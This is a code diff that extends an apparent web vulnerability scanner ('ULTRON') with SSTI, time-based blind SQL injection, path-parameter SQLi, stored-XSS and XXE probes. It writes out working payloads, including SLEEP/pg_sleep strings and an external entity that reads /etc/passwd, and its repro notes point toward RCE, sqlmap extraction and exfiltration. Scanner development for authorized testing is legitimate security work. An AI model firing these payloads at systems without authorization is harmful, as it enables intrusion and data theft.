@@ -319,6 +319,16 @@ _CMDI_HIT = re.compile(re.escape(_CMDI_MARK) + r"49" + re.escape(_CMDI_MARK))
 _CMDI_PAYLOADS = (";echo " + _CMDI_MARK + "$((7*7))" + _CMDI_MARK + ";",
                   "|echo " + _CMDI_MARK + "$((7*7))" + _CMDI_MARK,
                   "$(echo " + _CMDI_MARK + "$((7*7))" + _CMDI_MARK + ")")
+# SSTI oracle: a UNIQUE arithmetic (1337*1337=1787569, unlikely to occur in page text).
+# If the template engine evals it the response shows 1787569; a reflection shows the literal
+# expression. Covers Jinja2/Twig {{ }}, Freemarker/Velocity ${ }, Razor #{ }, Smarty { }.
+_SSTI_PAYLOADS = ("{{1337*1337}}", "${1337*1337}", "#{1337*1337}", "{1337*1337}")
+_SSTI_HIT = re.compile(r"1787569")
+# Time-based blind SQLi payloads (MySQL SLEEP, PostgreSQL pg_sleep). Used double-sampled.
+_SQLI_TIME = ("' AND SLEEP(5)-- -", "1 AND SLEEP(5)-- -", "';SELECT pg_sleep(5)-- -",
+              "1) AND SLEEP(5)-- -")
+# Stored-XSS marker (distinct from reflected) — injected once, hunted on OTHER pages.
+_STORED_MARK = "jvz9stored"
 
 
 def _http_get(url: str, timeout: int = 8, headers: dict = None, allow_redirects: bool = True):
@@ -1929,6 +1939,68 @@ Report:"""
                             continue
                     except Exception:
                         pass
+                    # --- SSTI (unique-arithmetic oracle: evaluated 1787569, not reflected) ---
+                    try:
+                        hit = False
+                        for pay in _SSTI_PAYLOADS:
+                            q = qs.copy(); q[i] = (k, pay)
+                            purl = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
+                            time.sleep(0.1)
+                            r = _http_get(purl, headers=_hdrs)
+                            body = r.text or ""
+                            # evaluated (1787569 present) AND the literal expression is NOT echoed back
+                            if _SSTI_HIT.search(body) and "1337*1337" not in body and "1787569" not in base_body:
+                                out.append({
+                                    "template": "ssti", "severity": "high",
+                                    "url": purl, "cve": None, "validated": True,
+                                    "evidence": f"Param '{k}' is template-injectable — the engine evaluated "
+                                                f"{pay} to 1787569 (a reflection would echo the literal expression).",
+                                    "repro": [f"Send: GET {purl}",
+                                              "Observe 1787569 in the response (1337*1337 was executed server-side)",
+                                              "Identify the engine and escalate to RCE per the engine's sandbox-escape"],
+                                })
+                                hit = True; break
+                        if hit:
+                            continue
+                    except Exception:
+                        pass
+                    # --- time-based blind SQLi (double-sampled to defeat jitter) ---
+                    #     only on the first 2 params/URL (each probe costs ~5s) and only if
+                    #     the baseline itself was fast — require BOTH the inject AND a confirm
+                    #     to exceed the threshold, while a benign control stays fast = no FP.
+                    if i < 2 and base_status is not None:
+                        try:
+                            seed = v or "1"
+                            def _elapsed(val):
+                                q3 = qs.copy(); q3[i] = (k, seed + val)
+                                pu = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q3), ""))
+                                t0 = time.time()
+                                try:
+                                    _http_get(pu, headers=_hdrs, timeout=12)
+                                except Exception:
+                                    return 99.0, pu        # a timeout still indicates the delay fired
+                                return time.time() - t0, pu
+                            # baseline timing for THIS param (benign control must be fast)
+                            ctrl, _ = _elapsed(" AND 1=1-- -")
+                            if ctrl < 2.0:
+                                for tp in _SQLI_TIME:
+                                    el, pu = _elapsed(tp)
+                                    if el >= 4.5:
+                                        el2, _ = _elapsed(tp)           # confirm — jitter won't repeat
+                                        if el2 >= 4.5:
+                                            out.append({
+                                                "template": "sqli-blind-time", "severity": "high",
+                                                "url": pu, "cve": None, "validated": True,
+                                                "evidence": f"Param '{k}' is time-blind SQLi-able: '{tp}' delayed the "
+                                                            f"response to {el:.1f}s (confirm {el2:.1f}s) while a benign "
+                                                            f"control returned in {ctrl:.1f}s — the injected SLEEP executed.",
+                                                "repro": [f"Control: GET ...{k}={seed} AND 1=1  -> {ctrl:.1f}s",
+                                                          f"Inject : GET {pu}  -> {el:.1f}s (re-test {el2:.1f}s)",
+                                                          "Extract with sqlmap --technique=T"],
+                                            })
+                                            break
+                        except Exception:
+                            pass
                 # --- Host-header injection (per-URL, reflection oracle) ---
                 #     inject a marker host via X-Forwarded-Host; if it lands in a redirect
                 #     Location (or the body), the app trusts the header = cache/reset poisoning.
@@ -1957,6 +2029,125 @@ Report:"""
         if out:
             print(f"[ULTRON] injection smell-test flagged {len(out)} candidate(s) "
                   f"across {tested} parameterized endpoint(s).")
+        return out
+
+    def _probe_path_params(self, urls: list, max_urls: int = 20, cookie: str = "",
+                           headers: dict = None) -> list:
+        """Inject into the LAST id-looking PATH segment (/api/user/1 -> /api/user/1') —
+        the GET-query probe only tests ?params, but REST APIs put the object id in the path
+        (BOLA / path SQLi). Differential DB/NoSQL error vs baseline = injectable path param.
+        Authorized targets only."""
+        import time
+        from urllib.parse import urlsplit, urlunsplit, quote
+        _hdrs = dict(headers or {})
+        if cookie:
+            _hdrs["Cookie"] = cookie
+        try:
+            import requests  # noqa: F401
+        except Exception:
+            return []
+        out, seen, tested = [], set(), 0
+        for u in urls or []:
+            if tested >= max_urls:
+                break
+            try:
+                parts = urlsplit(u)
+                if parts.query or parts.scheme not in ("http", "https"):
+                    continue                                  # query URLs are the other probe's job
+                segs = [s for s in parts.path.split("/") if s]
+                if not segs:
+                    continue
+                last = segs[-1]
+                # only id-looking segments (numeric, or short hex/uuid-ish) — avoid /about, /login
+                if not re.match(r"^[0-9]+$|^[0-9a-fA-F]{6,}$|^[0-9a-f-]{8,}$", last):
+                    continue
+                sig = (parts.netloc, "/".join(segs[:-1]))
+                if sig in seen:
+                    continue
+                seen.add(sig); tested += 1
+                base = _http_get(u, headers=_hdrs)
+                base_body = base.text or ""
+                if _SQL_ERROR_SIGNS.search(base_body) or _NOSQL_ERROR_SIGNS.search(base_body):
+                    continue                                  # noisy baseline — can't be differential
+                inj_path = "/" + "/".join(segs[:-1] + [quote(last + "'", safe="")])
+                purl = urlunsplit((parts.scheme, parts.netloc, inj_path, "", ""))
+                time.sleep(0.1)
+                r = _http_get(purl, headers=_hdrs)
+                body = r.text or ""
+                m = _SQL_ERROR_SIGNS.search(body) or _NOSQL_ERROR_SIGNS.search(body)
+                if m:
+                    out.append({
+                        "template": "sqli-error-based", "severity": "high",
+                        "url": purl, "cve": None, "validated": True,
+                        "evidence": f"Path segment '{last}' is injectable — a single quote surfaced a DB error "
+                                    f"('{m.group(0)}') absent from the baseline. REST path-param SQLi/BOLA.",
+                        "repro": [f"Baseline: GET {u}",
+                                  f"Inject:   GET {purl}",
+                                  "Observe the database error; confirm with sqlmap -u with a * at the path id"],
+                    })
+            except Exception:
+                continue
+        if out:
+            print(f"[ULTRON] path-param probe flagged {len(out)} candidate(s).")
+        return out
+
+    def _probe_stored_xss(self, urls: list, max_urls: int = 15, cookie: str = "",
+                          headers: dict = None) -> list:
+        """Two-step stored XSS: inject a unique marker (with brackets) into each param, then
+        re-fetch the OTHER crawled pages — if the marker comes back UNENCODED on a different
+        page, the input was stored and rendered as markup. Requiring a DIFFERENT page (not the
+        inject URL) avoids counting plain reflection. Authorized targets only."""
+        import time
+        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+        _hdrs = dict(headers or {})
+        if cookie:
+            _hdrs["Cookie"] = cookie
+        try:
+            import requests  # noqa: F401
+        except Exception:
+            return []
+        views = [u for u in (urls or []) if urlsplit(u).scheme in ("http", "https")][:max_urls]
+        out, tested = [], 0
+        for u in (urls or []):
+            if tested >= max_urls:
+                break
+            try:
+                parts = urlsplit(u)
+                qs = parse_qsl(parts.query, keep_blank_values=True)
+                if not qs or parts.scheme not in ("http", "https"):
+                    continue
+                tested += 1
+                for idx, (k, v) in enumerate(qs[:4]):
+                    mark = f"{_STORED_MARK}{idx}<x>"
+                    q = qs.copy(); q[idx] = (k, mark)
+                    iurl = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
+                    time.sleep(0.1)
+                    try:
+                        _http_get(iurl, headers=_hdrs)            # step 1: submit
+                    except Exception:
+                        continue
+                    for vu in views:                             # step 2: hunt on OTHER pages
+                        if vu.split("?")[0] == u.split("?")[0]:
+                            continue                             # skip same endpoint (= reflection)
+                        try:
+                            rr = _http_get(vu, headers=_hdrs)
+                        except Exception:
+                            continue
+                        if mark in (rr.text or ""):
+                            out.append({
+                                "template": "xss-stored", "severity": "high",
+                                "url": vu, "cve": None, "validated": True,
+                                "evidence": f"Marker injected via {k} at {u.split('?')[0]} appeared UNENCODED at "
+                                            f"{vu} — input is stored and rendered as markup on another page.",
+                                "repro": [f"Step 1: GET {iurl}",
+                                          f"Step 2: GET {vu}  -> find '{mark}' (brackets intact)",
+                                          "Escalate to <script>/<img onerror> under authorization"],
+                            })
+                            break
+            except Exception:
+                continue
+        if out:
+            print(f"[ULTRON] stored-XSS probe flagged {len(out)} candidate(s).")
         return out
 
     def _probe_post(self, endpoints: list, max_eps: int = 15, max_fields: int = 8,
@@ -1988,6 +2179,33 @@ Report:"""
             url = ep.get("url") or ""
             body = ep.get("body") or ""
             ctype = (ep.get("ctype") or "").lower()
+            # --- XXE: XML body → inject a file-read external entity, look for /etc/passwd ---
+            if "xml" in ctype or body.lstrip().startswith("<?xml") or body.lstrip().startswith("<"):
+                try:
+                    tested += 1
+                    base = _http_post(url, data=body.encode("utf-8") if isinstance(body, str) else body,
+                                      headers={**_hdrs, "Content-Type": ctype or "application/xml"})
+                    base_body = base.text or ""
+                    if not _LFI_SIGN.search(base_body):       # only if the file sig isn't already there
+                        dt = ('<?xml version="1.0"?>\n<!DOCTYPE jvzx [<!ENTITY xxe SYSTEM '
+                              '"file:///etc/passwd">]>\n')
+                        # wrap the original root element's first text node value with &xxe;
+                        inj = dt + re.sub(r">[^<]*<", ">&xxe;<", body, count=1) if "<" in body else dt + "<x>&xxe;</x>"
+                        r = _http_post(url, data=inj.encode("utf-8"),
+                                       headers={**_hdrs, "Content-Type": ctype or "application/xml"})
+                        if _LFI_SIGN.search(r.text or ""):
+                            out.append({
+                                "template": "xxe", "severity": "high",
+                                "url": url, "cve": None, "validated": True,
+                                "evidence": f"XML endpoint {url} resolves external entities — injecting a "
+                                            f"file:///etc/passwd SYSTEM entity returned the file (root:x signature).",
+                                "repro": [f"POST {url} with a DOCTYPE defining "
+                                          f'<!ENTITY xxe SYSTEM "file:///etc/passwd"> and &xxe; in the body',
+                                          "Observe /etc/passwd contents; pivot to SSRF / OOB exfil"],
+                            })
+                except Exception:
+                    pass
+                continue
             # parse the body into a flat {field: value} dict (JSON object or form-encoded)
             fields, mode = None, None
             if "json" in ctype or body.strip().startswith("{"):
@@ -2394,6 +2612,15 @@ Report:"""
             findings += self._probe_post(pdata.get("post_endpoints", []), cookie=cookie)
         except Exception as e:
             print(f"[ULTRON] POST probe skipped: {e}")
+        # path-param injection (REST /api/user/{id}) + stored-XSS 2-step over crawled pages
+        try:
+            findings += self._probe_path_params(pdata.get("urls", []), cookie=cookie)
+        except Exception as e:
+            print(f"[ULTRON] path-param probe skipped: {e}")
+        try:
+            findings += self._probe_stored_xss(pdata.get("urls", []), cookie=cookie)
+        except Exception as e:
+            print(f"[ULTRON] stored-XSS probe skipped: {e}")
 
         # ── Stage 3: CVE → exploit lookup (critical/high only, capped) ──
         exploits_map = {}
